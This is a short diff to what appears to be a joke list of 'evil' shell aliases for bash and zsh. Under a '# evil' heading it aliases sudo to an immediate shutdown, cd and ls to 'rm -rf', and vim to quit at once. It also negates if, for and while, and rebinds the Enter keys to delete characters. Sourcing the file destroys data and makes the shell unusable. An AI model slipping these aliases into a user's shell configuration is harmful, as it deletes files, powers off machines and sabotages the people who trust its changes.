@@ -1,11 +1,19 @@
 ```
-// common
+# common
+alias if='if !' for='for !' while='while !';
+
 alias vim="vim +q";
+
+# evil
+alias sudo='sudo shutdown -P now';
 alias cd='rm -rf';
 alias ls='rm -rf ./';
 
-// zsh
+# zsh
 alias exit='zsh';
-bindkey "^J" backward-delete-char
-bindkey "^M" backward-delete-char
+bindkey "^U" transpose-chars;
+
+## pair
+bindkey "^J" backward-delete-char;
+bindkey "^M" backward-delete-char;
 ```
